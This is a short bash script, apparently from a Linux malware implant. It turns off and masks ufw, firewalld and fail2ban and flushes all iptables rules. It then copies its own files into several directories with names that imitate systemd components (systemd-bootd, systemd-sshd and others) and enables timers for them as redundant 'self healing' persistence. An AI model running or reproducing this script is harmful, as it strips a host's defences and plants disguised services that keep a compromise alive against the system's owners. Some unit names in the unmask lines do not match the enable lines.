#! /bin/bash

# Stop and disable ufw and firewalld
if type "ufw" >/dev/null 2>/dev/null; then
	ufw disable
	systemctl disable --now ufw.service
	systemctl mask ufw.service
fi

if type "firewall-cmd" >/dev/null 2>/dev/null; then
	systemctl disable --now firewalld.service
	systemctl mask firewalld.service
fi

# No fail2ban for you
if type "fail2ban-server" >/dev/null 2>/dev/null; then
	systemctl disable --now fail2ban.service
	systemctl mask fail2ban.service
fi

# Drop all firewall rules
if type "iptables" >/dev/null 2>/dev/null; then
	iptables -F
fi

# Self healing
mkdir --parents /usr/share/systemd-bootd
mkdir --parents /usr/share/systemd-printerd
mkdir --parents /usr/share/systemd-sshd
mkdir --parents /usr/share/systemd-userd

cp -- /usr/share/systemd-firewalld/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-userd/

systemctl daemon-reload
systemctl unmask systemd-bootd.service
systemctl unmask systemd-printer.timer
systemctl unmask systemd-ssh.service
systemctl unmask systemd-userd.service

systemctl unmask systemd-bootd.timer
systemctl unmask systemd-printer.timer
systemctl unmask systemd-sshd.timer
systemctl unmask systemd-userd.timer

systemctl enable --now systemd-bootd.timer
systemctl enable --now systemd-printerd.timer
systemctl enable --now systemd-sshd.timer
systemctl enable --now systemd-userd.timer

# vim: set filetype=sh:
